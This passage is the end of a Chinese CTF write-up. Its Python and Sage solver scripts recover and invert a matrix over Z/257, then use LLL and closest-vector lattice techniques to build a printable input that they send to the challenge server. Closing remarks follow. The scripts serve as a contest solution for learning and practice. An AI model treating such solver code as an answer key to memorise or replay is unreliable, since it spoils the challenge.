        delt = [i*pow(128, -1, 257) % 257 for i in delt]
        for i in range(128):
            if basec[i]==0 or deltc[i]==0:
                continue
            if got[i] is None:
                got[i] = delt[i]
            else:
                assert got[i] == delt[i]
        if any(i is not None for i in got):#use sage to refill it
            break
    assert any(i is not None for i in got)
    matline.append(got)
    print(got,lines,GCNT)

# print(matline)


f=open("tmpX_%s.txt"%session,"w")
f.write(repr(matline))
f.close()

os.system("sage fills.sage %s"%session)

f=open("tmpY_%s.txt"%session,"r")
matline = eval(f.read())
f.close()
os.unlink("tmpY_%s.txt"%session)

assert len(matline) == 128

assert len(matline) == 128

A = Matrix(matline)
assert A.shape == (128, 128)

f=open("tmpA_%s.txt"%session,"w")
f.write(repr(matline))
f.close()

os.system("time timeout 3m sage inv.sage %s"%session)

f=open("tmpinvA_%s.txt"%session,"r")
matline = eval(f.read())
f.close()
os.unlink("tmpinvA_%s.txt"%session)

invA = Matrix(matline)

f=open("result_%s.txt"%session,"r")
mess = f.read().strip()
f.close()
os.unlink("result_%s.txt"%session)
print(mess)
print(len(mess))

r.sendlineafter(">", mess)

r.interactive()

```

```python
import sys
import os
session = sys.argv[1]

f=open("tmpX_%s.txt"%session,"r")
matline = eval(f.read())
f.close()
os.unlink("tmpX_%s.txt"%session)

for i in range(128):
    if matline[i][i] is not None:
        matline[i][i]-=1

A = matrix(Zmod(257), matline[:72])

# print(A.rank())
assert A.rank() == 64

newline=[]

for olines in range(72,128):
    ppl=[]
    vec=[]
    for i in range(128):
        if matline[olines][i] is not None:
            ppl.append(i)
            vec.append(matline[olines][i])
    nA=A.matrix_from_columns(ppl).transpose()
    nvec=vector(Zmod(257), vec)
    # print(nA.nrows(),nA.ncols(),len(nvec))
    wei=nA.solve_right(vec)
    assert nA*wei == nvec
    rline=A.transpose()*wei
    newline.append(list(rline))
    print(rline)

invline=matline[:72]+newline
invline=list(zip(*invline))

for i in range(128):
    invline[i]=list(invline[i])
    if invline[i][i]:
        invline[i][i]+=1

f=open("tmpY_%s.txt"%session,"w")
f.write(repr(invline))
f.close()
```

```python
import sys
import os
session = sys.argv[1]

f=open("tmpA_%s.txt"%session,"r")
matline = eval(f.read())
f.close()
os.unlink("tmpA_%s.txt"%session)

A = matrix(Zmod(257), matline)
assert A.rank() == 128

invA = A.inverse()
assert invA*A == identity_matrix(128)

invline=[list(i) for i in invA]
f=open("tmpinvA_%s.txt"%session,"w")
f.write(repr(invline))
f.close()

import logging

def shortest_vectors(B):
    """
    Computes the shortest non-zero vectors in a lattice.
    :param B: the basis of the lattice
    :return: a generator generating the shortest non-zero vectors
    """
    logging.debug(f"Computing shortest vectors in {B.nrows()} x {B.ncols()} matrix...")
    B = B.LLL()

    for row in B.rows():
        if not row.is_zero():
            yield row


# Babai's Nearest Plane Algorithm from "Lecture 3: CVP Algorithm" by Oded Regev.
def _closest_vectors_babai(B, t):
    B = B.LLL()

    for G in B.gram_schmidt():
        b = t
        for j in reversed(range(B.nrows())):
            b -= round((b * G[j]) / (G[j] * G[j])) * B[j]

        yield t - b


def _closest_vectors_embedding(B, t):
    B_ = B.new_matrix(B.nrows() + 1, B.ncols() + 1)
    for row in range(B.nrows()):
        for col in range(B.ncols()):
            B_[row, col] = B[row, col]

    for col in range(B.ncols()):
        B_[B.nrows(), col] = t[col]

    B_[B.nrows(), B.ncols()] = 1
    yield from shortest_vectors(B_)


def closest_vectors(B, t, algorithm="embedding"):
    """
    Computes the closest vectors in a lattice to a target vector.
    :param B: the basis of the lattice
    :param t: the target vector
    :param algorithm: the algorithm to use, can be "babai" or "embedding" (default: "embedding")
    :return: a generator generating the shortest non-zero vectors
    """
    logging.debug(f"Computing closest vectors in {B.nrows()} x {B.ncols()} matrix...")
    if algorithm == "babai":
        yield from _closest_vectors_babai(B, t)
    elif algorithm == "embedding":
        yield from _closest_vectors_embedding(B, t)

rsA=A-1
Y=(rsA*vector(Zmod(257),[int(0x4f)]*128))

# print(Y)

ZA=matrix(ZZ,rsA)
ZY=vector(ZZ,Y)

A = matrix(ZZ, 128*2,128*2)

for i in range(128):
    A[i,i]=1
FAC=1024
for i in range(128):
    for j in range(128):
        A[j,i+128]=ZA[i,j]*FAC
    A[i+128,i+128]=-257*FAC

print("WORKING")

tgy=vector(ZZ,[int(0x4f)]*128+[0]*128)
for vec in closest_vectors(A,tgy):
    assert len(vec)==257
    if vec[-4]!=0:
        continue
    # print(vec[-4:])
    if vec[-1]==1:
        vec=[-int(x) for x in vec]
    if vec[-1]!=-1:
        continue
    print("HIT")
    print(vec)
    rest=[int(x+0x4f) for x in vec[:128]]
    testc=[0x20 <= m < 0x7f for m in rest]
    print(testc.count(False))
    if not all( 0x20 <= m < 0x7f for m in rest):
        continue
    tx=vector(Zmod(257),rest)
    print(rsA*tx)
    print(rest)
    print(bytes(rest))
    f=open("result_%s.txt"%session,"w")
    f.write(bytes(rest).hex())
    f.close()
    exit(0)
    print()
```

## 0x1C 旧日之痕

稍微看了一眼，这什么玩意，感觉不太能做。还是写个标题凑个数整个全题目好（雾）。只能说 mcfx 是神。

## 0xFF 感想

题出的好！难度适中，覆盖知识点广，题目又着切合实际的背景，解法比较自然。给出题人点赞！

总之水平还是不够，居然没有拿到第二😡😡😡，大早上还被偷了痛失第三。

明年一定再来。

